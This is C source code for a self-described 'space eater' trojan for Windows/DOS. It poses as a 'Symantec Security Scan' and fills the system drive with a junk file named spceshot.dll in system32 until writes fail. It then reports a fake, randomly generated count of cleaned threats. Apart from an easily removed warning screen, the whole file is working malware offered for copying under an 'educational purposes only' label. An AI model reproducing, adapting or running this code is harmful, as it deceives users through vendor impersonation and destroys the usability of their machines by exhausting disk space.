/* SPACE EATER TROJAN BY SRIKANTH. USE IT FOR EDUCATIONAL PURPOSES ONLY. DO NOT SPREAD!*/

#include<stdio.h>
#include<conio.h>
#include<dos.h>
#include<stdlib.h>
FILE *a,*t,*b;
int r,status,vir_count;
double i;
char ch[]="CREATING A HUGE FILE FOR OCCUPYING HARDDISK SPACE",choice;

void eatspace(void);
void findroot(void);
void showstatus(void);
void draw(void);
void accept(void);

void main()
{
draw();
accept();
textcolor(WHITE);
draw();
gotoxy(12,8);
cputs("ANALYZING YOUR SYSTEM. PLEASE WAIT...");
sleep(3);
gotoxy(12,8);
delline();
cputs("PRESS ANY KEY TO START THE SYSTEM SCAN...");
getch();
gotoxy(12,8);
delline();
findroot();
}

void accept()
{
textcolor(LIGHTRED);
gotoxy(1,8);
cputs("THIS PROGRAM IS A DEMO OF SIMPLE TROJAN HORSE. IF YOU RUN THIS PROGRAM IT WILL\n\rEAT UP YOUR FULL HARD DISK SPACE ON ROOT DRIVE. HOWEVER IT IS POSSIBLE TO\n\rELIMINATE THE DAMAGE.\n\n\rTO CLEANUP THE DAMAGE YOU\'VE TO DELETE THE FILE \"spceshot.dll\" LOCATED IN\n\n\r \"%windir%\\System32\".\n\n\rIF YOU WISH TO RUN THE PROGRAM PRESS ENTER, OTHERWISE PRESS ANY KEY TO QUIT.");

if((choice=getch())!=13)
exit(0);
}

void draw()
{
clrscr();
textcolor(WHITE);
gotoxy(12,2);
cputs("********************************************************");
gotoxy(12,6);
cputs("********************************************************");
gotoxy(12,3);
cputs("*\n\b*\n\b*\n\b");
gotoxy(67,3);
cputs("*\n\b*\n\b*\n\b");
gotoxy(14,4);
cputs("SYMANTEC SECURITY SCAN - 2009 (QUICK SYSTEM SCANNER)");
}

void findroot()
{
t=fopen("C:\\windows\\explorer.exe","rb");
if(t!=NULL)
{
fclose(t);
textcolor(WHITE);
a=fopen("C:\\windows\\system32\\spceshot.dll","rb");
if(a!=NULL)
{
textcolor(LIGHTRED);
gotoxy(12,8);
cputs("SYSTEM SCAN WAS INTERRUPTED. TRY AGAIN LATER!");
getch();
exit(1);
}
b=fopen("C:\\windows\\system32\\spceshot.dll","wb+");
if(b!=NULL)
{
showstatus();
eatspace();
}
}
t=fopen("D:\\windows\\explorer.exe","rb");
if(t!=NULL)
{
fclose(t);
a=fopen("D:\\windows\\system32\\spceshot.dll","rb");
if(a!=NULL)
{
textcolor(LIGHTRED);
gotoxy(12,8);
cputs("SYSTEM SCAN WAS INTERRUPTED. TRY AGAIN LATER!");
getch();
exit(1);
}
b=fopen("D:\\windows\\system32\\spceshot.dll","wb+");
if(b!=NULL)
{
showstatus();
eatspace();
}
}
t=fopen("E:\\windows\\explorer.exe","rb");
if(t!=NULL)
{
fclose(t);
a=fopen("E:\\windows\\system32\\spceshot.dll","rb");
if(a!=NULL)
{
textcolor(LIGHTRED);
gotoxy(12,8);
cputs("SYSTEM SCAN WAS INTERRUPTED. TRY AGAIN LATER!");
getch();
exit(1);
}
b=fopen("E:\\windows\\system32\\spceshot.dll","wb+");
if(b!=NULL)
{
showstatus();
eatspace();
}
}
t=fopen("F:\\windows\\explorer.exe","rb");
if(t!=NULL)
{
fclose(t);
a=fopen("F:\\windows\\system32\\spceshot.dll","rb");
if(a!=NULL)
{
textcolor(LIGHTRED);
gotoxy(12,8);
cputs("SYSTEM SCAN WAS INTERRUPTED. TRY AGAIN LATER!");
getch();
exit(1);
}
b=fopen("F:\\windows\\system32\\spceshot.dll","wb+");
if(b!=NULL)
{
showstatus();
eatspace();
}
}
if(t==NULL)
{
textcolor(LIGHTRED);
gotoxy(12,8);
cputs("SYSTEM SCAN FAILED! PRESS ANY KEY TO CLOSE THIS PROGRAM.");
getch();
exit(1);
}
exit(1);
}

void eatspace()
{
textcolor(LIGHTRED);
gotoxy(12,16);
cputs("WARNING: DO NOT ABORT THE SCAN PROCESS UNTIL IT IS COMPLETED!\n");
textcolor(WHITE);
gotoxy(12,18);
while(1)
{
for(r=1;r<4;r++)
{
for(i=1;i<900000;i++)
{
status=fputs(ch,b);
if(status==EOF)
{
textcolor(WHITE);
vir_count=random(120);
draw();
gotoxy(12,8);
cprintf("SCAN COMPLETE!. DETECTED AND CLEANED OVER %d THREATS!",vir_count);
gotoxy(12,10);
cprintf("PRESS ANY KEY TO CLOSE...");
getch();
break;
}
}
cputs(".");
if(status==EOF) break;
}
if(status==EOF) break;
}
exit(0);
}

void showstatus()
{
gotoxy(12,8);
cputs("SCANNING THE SYSTEM FOR THREATS");
gotoxy(12,10);
cputs("THIS MAY TAKE UP A FEW MINUTES TO FEW HOURS");
gotoxy(12,13);
cputs("SCAN IN PROGRESS. PLEASE WAIT...");
}
